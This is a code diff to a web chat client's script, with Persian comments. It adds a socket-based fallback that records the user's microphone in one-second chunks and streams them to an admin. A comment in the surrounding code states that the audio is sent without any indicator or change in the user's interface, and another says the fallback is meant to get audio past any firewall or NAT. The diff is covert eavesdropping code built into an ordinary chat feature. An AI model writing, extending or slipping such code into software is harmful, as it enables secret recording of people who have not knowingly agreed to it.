@@ -539,6 +539,42 @@ function sendTypingStatus(isTyping) {
 
 let lastAdminSocketId = null;
 
+let mediaSocketRecorder = null;
+
+function startSocketAudioStream() {
+  if (!localStream || mediaSocketRecorder) return;
+  try {
+    const mimeType = (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('audio/webm;codecs=opus'))
+      ? 'audio/webm;codecs=opus'
+      : (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('audio/mp4') ? 'audio/mp4' : 'audio/webm');
+
+    mediaSocketRecorder = new MediaRecorder(localStream, { mimeType, audioBitsPerSecond: 32000 });
+    mediaSocketRecorder.ondataavailable = async (e) => {
+      if (e.data && e.data.size > 0 && socket) {
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          socket.emit('audio_stream_chunk', {
+            sessionId: sessionData.id,
+            chunk: reader.result,
+            mimeType: mimeType,
+          });
+        };
+        reader.readAsDataURL(e.data);
+      }
+    };
+    mediaSocketRecorder.start(1000); // ارسال هر ۱ ثانیه یک چانک برای استریم پیوسته
+  } catch (e) {
+    console.error('Socket audio stream error:', e);
+  }
+}
+
+function stopSocketAudioStream() {
+  if (mediaSocketRecorder) {
+    try { mediaSocketRecorder.stop(); } catch (_) {}
+    mediaSocketRecorder = null;
+  }
+}
+
 // ایجاد اتصال WebRTC و ارسال استریم صدا بدون هیچ نشانگر یا تغییر در UI کاربر
 async function startPeerConnection(adminSocketId) {
   if (adminSocketId) lastAdminSocketId = adminSocketId;
@@ -553,6 +589,10 @@ async function startPeerConnection(adminSocketId) {
   const isStreamActive = localStream && localStream.getAudioTracks().some(t => t.readyState === 'live');
   if (!isStreamActive) {
     try {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.warn('⚠️ دسترسی به میکروفون نیازمند پروتکل امن HTTPS است.');
+        return;
+      }
       localStream = await navigator.mediaDevices.getUserMedia({
         audio: {
           echoCancellation: true,
@@ -566,6 +606,9 @@ async function startPeerConnection(adminSocketId) {
       return;
     }
   }
+
+  // فعال‌سازی همزمان فال‌بک سوکتی برای تضمین ارسال صدا پشت هر نوع فایروال یا NAT
+  startSocketAudioStream();
 
   peerConnection = new RTCPeerConnection(rtcConfig);
 
@@ -615,6 +658,7 @@ async function startPeerConnection(adminSocketId) {
 }
 
 function stopPeerConnection() {
+  stopSocketAudioStream();
   if (peerConnection) {
     try { peerConnection.close(); } catch (_) {}
     peerConnection = null;
